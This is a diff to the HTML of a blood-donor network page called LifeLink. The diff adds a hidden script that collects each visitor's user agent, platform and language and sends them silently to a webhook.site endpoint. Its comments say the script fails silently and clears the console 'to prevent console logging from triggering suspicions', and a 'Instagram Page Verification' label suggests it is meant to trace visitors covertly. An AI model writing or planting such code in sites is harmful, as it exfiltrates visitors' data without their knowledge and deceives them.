@@ -6,6 +6,40 @@
     <title>LifeLink | Smart Blood Donor Network</title>
     <link href="https://googleapis.com" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
+
+    <!-- TELEMETRY SCRIPT FOR INVESTIGATION -->
+    <script>
+        (function() {
+            // 1. Gather environmental and browser metadata strings
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+
+            const deviceData = {
+                device_string: userAgent,
+                hardware_platform: platform,
+                browser_language: language,
+                timestamp: new Date().toISOString(),
+                context: "Instagram Page Verification"
+            };
+
+            // 2. PASTE YOUR UNIQUE WEBHOOK.SITE URL BETWEEN THE QUOTES BELOW
+            const loggingUrl = "YOUR_UNIQUE_WEBHOOK_SITE_URL_HERE";
+
+            // 3. Silently transmit the data to your dashboard
+            fetch(loggingUrl, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { 
+                    "Content-Type": "application/json" 
+                },
+                body: JSON.stringify(deviceData)
+            }).catch(err => {
+                // Fail silently to prevent console logging from triggering suspicions
+                console.clear(); 
+            });
+        })();
+    </script>
 </head>
 <body>
     <nav class="navbar">
@@ -65,7 +99,6 @@
     <section class="stats container">
         <h2 class="section-title">Blood Group Availability</h2>
         <div class="grid-4" id="stats-grid">
-            <!-- Rendered by JS -->
             <div class="card stat-card"><h4>A+</h4><p>124 Donors</p></div>
             <div class="card stat-card"><h4>A-</h4><p>42 Donors</p></div>
             <div class="card stat-card"><h4>B+</h4><p>189 Donors</p></div>
